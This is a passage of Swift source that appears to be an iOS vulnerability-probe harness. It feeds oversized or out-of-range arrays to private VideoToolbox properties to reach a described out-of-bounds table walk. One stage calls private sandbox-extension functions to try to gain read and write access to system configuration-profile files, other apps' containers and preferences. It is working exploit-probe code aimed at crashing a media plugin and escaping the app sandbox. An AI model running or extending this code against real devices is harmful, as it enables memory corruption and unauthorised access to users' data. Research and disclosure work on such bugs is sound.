            p[off + 1] = Int8(bitPattern: UInt8((len >> 16) & 0xff))
            p[off + 2] = Int8(bitPattern: UInt8((len >> 8) & 0xff))
            p[off + 3] = Int8(bitPattern: UInt8(len & 0xff))
            off += 4
            n.withUnsafeBufferPointer { src in
                memcpy(p + off, src.baseAddress!, n.count)
            }
            off += n.count
        }
        var block: CMBlockBuffer?
        let bst = CMBlockBufferCreateWithMemoryBlock(allocator: kCFAllocatorDefault, memoryBlock: p,
                                                 blockLength: total, blockAllocator: kCFAllocatorNull,
                                                 customBlockSource: nil, offsetToData: 0, dataLength: total,
                                                 flags: 0, blockBufferOut: &block)
        guard bst == 0, let bb = block else { return (nil, "blockCreate=\(bst)") }
        var timing = CMSampleTimingInfo(duration: CMTime(value: 1, timescale: 30),
                                        presentationTimeStamp: CMTime(value: pts, timescale: 30),
                                        decodeTimeStamp: .invalid)
        var sb: CMSampleBuffer?
        let sst = CMSampleBufferCreate(allocator: kCFAllocatorDefault, dataBuffer: bb, dataReady: true,
                                   makeDataReadyCallback: nil, refcon: nil, formatDescription: fd,
                                   sampleCount: 1, sampleTimingEntryCount: 1, sampleTimingArray: &timing,
                                   sampleSizeEntryCount: 0, sampleSizeArray: nil,
                                   sampleBufferOut: &sb)
        guard sst == 0, let s = sb else { return (nil, "sbCreate=\(sst)") }
        return (s, "ok")
    }

    /// Stage 21: RequestedMVHEVCVideoLayerIDs validation — pre-fix accepts any ids.
    func stage21() {
        guard let enc = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("stage21: no encoder"); return
        }
        _ = VTSessionSetProperty(enc, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanFalse)
        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        var pb: CVPixelBuffer?
        _ = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
        guard let pixel = pb else { emit("stage21: no pixel"); return }
        var fd: CMVideoFormatDescription?
        _ = VTCompressionSessionEncodeFrame(
            enc, imageBuffer: pixel, presentationTimeStamp: CMTime(value: 0, timescale: 30),
            duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { status, _, sb in
            if status == 0, let sb = sb { fd = CMSampleBufferGetFormatDescription(sb) }
        }
        VTCompressionSessionCompleteFrames(enc, untilPresentationTimeStamp: .invalid)
        VTCompressionSessionInvalidate(enc)
        guard let f = fd else { emit("stage21: no format description"); return }

        let cases: [[Int]] = [[0, 1], [0], [63], [64], [0, 64], Array(0..<64), Array(0..<300), [999999]]
        for (i, ids) in cases.enumerated() {
            var ds: VTDecompressionSession?
            let cst = VTDecompressionSessionCreate(allocator: kCFAllocatorDefault, formatDescription: f,
                                                   decoderSpecification: nil, imageBufferAttributes: nil,
                                                   outputCallback: nil, decompressionSessionOut: &ds)
            guard cst == 0, let d = ds else { emit("stage21[\(i)] decCreate=\(cst)"); continue }
            let arr = ids.map { NSNumber(value: $0) } as CFArray
            let st = VTSessionSetProperty(d, key: "RequestedMVHEVCVideoLayerIDs" as CFString,
                                          value: arr)
            emit("stage21[\(i)] ids=\(ids.count) first=\(ids.first ?? -1) last=\(ids.last ?? -1) status=\(st)")
            VTDecompressionSessionInvalidate(d)
        }
        emit("stage21 survived")
    }

    /// Stage 11: feed DPBRequirements an N-element array. Pre-fix the plugin stores the
    /// raw element count and walks a fixed 17-slot table; 27.2 adds a count<17 gate.
    func stage11(n: Int) {
        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("stage11(\(n)): no session"); return
        }
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanFalse)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowFrameReordering, value: kCFBooleanTrue)
        let arr = (0..<n).map { NSNumber(value: $0 % 16) }
        let st = VTSessionSetProperty(session, key: "DPBRequirements" as CFString, value: arr as CFArray)
        emit("stage11(\(n)) dpbSetStatus=\(st) readback: " + readBack(session, "DPBRequirements" as CFString))

        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        var pb: CVPixelBuffer?
        _ = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                attrs as CFDictionary, &pb)
        guard let pixel = pb else { emit("stage11(\(n)): no pixel"); return }
        for i in 0..<3 {
            let pts = CMTime(value: CMTimeValue(i), timescale: 30)
            let est = VTCompressionSessionEncodeFrame(
                session, imageBuffer: pixel, presentationTimeStamp: pts,
                duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { _, _, _ in }
            emit("stage11(\(n)) encode[\(i)] status=\(est)")
            if est != 0 { break }
        }
        VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)
        emit("stage11(\(n)) survived")
        VTCompressionSessionInvalidate(session)
        emit("stage11 complete")
    }

    /// Stage 6: encode a moving frame at a given temporal-layer count and dump the bitstream,
    /// so the VPS/SPS sub-layer count can be read back offline.
    func stage6(num: Int) {
        guard let session = makeSession(codec: kCMVideoCodecType_HEVC, w: 1280, h: 720) else {
            emit("stage6(\(num)): no session"); return
        }
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_RealTime, value: kCFBooleanFalse)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowFrameReordering, value: kCFBooleanTrue)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_AllowTemporalCompression, value: kCFBooleanTrue)
        _ = VTSessionSetProperty(session, key: kVTCompressionPropertyKey_ExpectedFrameRate, value: NSNumber(value: 30))
        _ = VTSessionSetProperty(session, key: "BaseLayerFrameRate" as CFString, value: NSNumber(value: 30 / max(num, 1)))
        let st = VTSessionSetProperty(session, key: "NumberOfTemporalLayers" as CFString, value: NSNumber(value: num))
        emit("stage6(\(num)) set NumberOfTemporalLayers status=\(st)")

        var attrs: [CFString: Any] = [:]
        attrs[kCVPixelBufferIOSurfacePropertiesKey] = [:] as CFDictionary
        var pb: CVPixelBuffer?
        let pst = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                                      kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                                      attrs as CFDictionary, &pb)
        guard let pixel = pb else { emit("stage6: no pixel (\(pst))"); return }

        var bitstream = Data()
        var fmtDesc: CMVideoFormatDescription?

        for f in 0..<30 {
            CVPixelBufferLockBaseAddress(pixel, [])
            if let y = CVPixelBufferGetBaseAddressOfPlane(pixel, 0) {
                let h = CVPixelBufferGetHeightOfPlane(pixel, 0)
                let bpr = CVPixelBufferGetBytesPerRowOfPlane(pixel, 0)
                let p = y.assumingMemoryBound(to: UInt8.self)
                for r in 0..<h {
                    let row = p + r * bpr
                    for c in 0..<1280 { row[c] = UInt8(truncatingIfNeeded: (r * 7 + c * 3 + f * 29)) }
                }
            }
            if let uv = CVPixelBufferGetBaseAddressOfPlane(pixel, 1) {
                let h = CVPixelBufferGetHeightOfPlane(pixel, 1)
                let bpr = CVPixelBufferGetBytesPerRowOfPlane(pixel, 1)
                memset(uv, 128, h * bpr)
            }
            CVPixelBufferUnlockBaseAddress(pixel, [])

            let pts = CMTime(value: CMTimeValue(f), timescale: 30)
            let est = VTCompressionSessionEncodeFrame(
                session, imageBuffer: pixel, presentationTimeStamp: pts,
                duration: .invalid, frameProperties: nil, infoFlagsOut: nil) { status, _, sb in
                guard status == 0, let sb = sb else { return }
                if fmtDesc == nil { fmtDesc = CMSampleBufferGetFormatDescription(sb) }
                guard let db = CMSampleBufferGetDataBuffer(sb) else { return }
                var len = 0
                var ptr: UnsafeMutablePointer<Int8>?
                if CMBlockBufferGetDataPointer(db, atOffset: 0, lengthAtOffsetOut: nil,
                                               totalLengthOut: &len, dataPointerOut: &ptr) == 0,
                   let p = ptr, len > 0 {
                    bitstream.append(contentsOf: UnsafeBufferPointer(
                        start: UnsafeRawPointer(p).assumingMemoryBound(to: UInt8.self), count: len))
                }
            }
            if est != 0 { emit("stage6 encode[\(f)] status=\(est)"); break }
        }
        VTCompressionSessionCompleteFrames(session, untilPresentationTimeStamp: .invalid)
        var psBytes = Data()
        if let fd = fmtDesc {
            var cnt = 0
            var hdr: Int32 = 0
            let r0 = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fd, parameterSetIndex: 0, parameterSetPointerOut: nil,
                parameterSetSizeOut: nil, parameterSetCountOut: &cnt, nalUnitHeaderLengthOut: &hdr)
            var i = 0
            while i < Int(cnt) {
                var p: UnsafePointer<UInt8>?
                var sz = 0
                let r = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    fd, parameterSetIndex: i, parameterSetPointerOut: &p,
                    parameterSetSizeOut: &sz, parameterSetCountOut: nil, nalUnitHeaderLengthOut: nil)
                if r == 0, let p = p, sz > 0 {
                    psBytes.append(contentsOf: UnsafeBufferPointer(start: p, count: sz))
                }
                i += 1
            }
            emit("stage6(\(num)) paramSets count=\(cnt) hdrLen=\(hdr) r0=\(r0) bytes=\(psBytes.count)")
            let psURL = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
                .appendingPathComponent("out_\(num).ps")
            try? psBytes.write(to: psURL)
        } else {
            emit("stage6(\(num)) no format description")
        }
        let url = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("out_\(num).bin")
        try? bitstream.write(to: url)
        emit("stage6(\(num)) bytes=\(bitstream.count) saved=\(url.lastPathComponent)")
        VTCompressionSessionInvalidate(session)
    }

    /// Stage SBE: can a third-party app issue sandbox extensions for paths outside its container?
    func stageSandboxExtensions() {
        emit("=== SBE: sandbox extension issuance probe ===")
        typealias IssueFile = @convention(c) (UnsafePointer<CChar>, UnsafePointer<CChar>, UInt32) -> UnsafeMutablePointer<CChar>?
        typealias IssueByPid = @convention(c) (UnsafePointer<CChar>, UnsafePointer<CChar>, UInt32, Int32) -> UnsafeMutablePointer<CChar>?
        typealias Consume = @convention(c) (UnsafePointer<CChar>) -> Int64
        typealias Release = @convention(c) (Int64) -> Int32

        guard let h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", RTLD_NOW) else {
            emit("SBE dlopen failed errno=\(errno)")
            return
        }
        guard let sIssue = dlsym(h, "sandbox_extension_issue_file"),
              let sConsume = dlsym(h, "sandbox_extension_consume"),
              let sRelease = dlsym(h, "sandbox_extension_release") else {
            emit("SBE dlsym failed errno=\(errno)")
            return
        }
        let issue = unsafeBitCast(sIssue, to: IssueFile.self)
        let consume = unsafeBitCast(sConsume, to: Consume.self)
        let release = unsafeBitCast(sRelease, to: Release.self)
        let issueByPid: IssueByPid? = dlsym(h, "sandbox_extension_issue_file_to_process_by_pid")
            .map { unsafeBitCast($0, to: IssueByPid.self) }

        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let control = docs.appendingPathComponent("sbe_control.txt")
        try? "control".data(using: .utf8)?.write(to: control)

        let sg = "/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles"
        let targets: [(String, String)] = [
            ("own-file", control.path),
            ("own-dir", docs.path),
            ("cfg-plist", sg + "/Library/ConfigurationProfiles/CloudConfigurationDetails.plist"),
            ("cfg-dir", sg + "/Library/ConfigurationProfiles"),
            ("cfg-root", sg),
            ("var-mobile-prefs", "/var/mobile/Library/Preferences"),
            ("containers-data", "/var/mobile/Containers/Data/Application"),
            ("containers-bundle", "/private/var/containers/Bundle/Application"),
            ("sys-version", "/System/Library/CoreServices/SystemVersion.plist"),
            ("private-tmp", "/private/tmp"),
        ]
        let classes = ["com.apple.app-sandbox.read", "com.apple.app-sandbox.read-write"]
        let flagVals: [(String, UInt32)] = [("default", 0), ("canonical", 2)]

        for (name, path) in targets {
            for cls in classes {
                let short = cls == "com.apple.app-sandbox.read" ? "R" : "RW"
                for (fn, fl) in flagVals {
                    errno = 0
                    var line = ""
                    if let tok = issue(cls, path, fl) {
                        line = "issue=OK len=\(strlen(tok))"
                        let handle = consume(tok)
                        let cerr = errno
                        if handle >= 0 {
                            var acc = "listdir="
                            if let names = try? FileManager.default.contentsOfDirectory(atPath: path) {
                                acc += "OK(\(names.count))"
                            } else {
                                acc += "no(\(errno))"
                            }
                            let fd = open(path, O_RDONLY)
                            let oerr = errno
                            if fd >= 0 {
                                close(fd)
                                acc += " open-ro=OK"
                                if short == "RW" {
                                    let wfd = open(path, O_RDWR)
                                    let werr = errno
                                    if wfd >= 0 { close(wfd); acc += " open-rw=OK" } else { acc += " open-rw=err(\(werr))" }
                                }
                            } else {
                                acc += " open-ro=err(\(oerr))"
                            }
                            _ = release(handle)
                            line += " consume=\(handle) \(acc)"
                        } else {
                            line += " consume=fail(\(cerr))"
                        }
                        free(tok)
                    } else {
                        line = "issue=FAIL errno=\(errno)"
                    }
                    emit("SBE \(name) \(short)/\(fn) -> \(line)  [\(path)]")
                }
            }
        }

        if let byPid = issueByPid {
            for (name, path) in targets {
                for cls in classes {
                    let short = cls == "com.apple.app-sandbox.read" ? "R" : "RW"
                    errno = 0
                    if let tok = byPid(cls, path, 0, getpid()) {
                        emit("SBE-by-pid \(name) \(short) -> OK len=\(strlen(tok))  [\(path)]")
                        free(tok)
                    } else {
                        emit("SBE-by-pid \(name) \(short) -> FAIL errno=\(errno)  [\(path)]")
                    }
                }
            }
        } else {
            emit("SBE-by-pid dlsym unavailable")
        }
        emit("=== SBE done ===")
    }

    func writeReport() {
        let url = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("ave_report.txt")
        try? log.write(to: url, atomically: true, encoding: .utf8)
        emit("report=\(url.path)")
    }
}
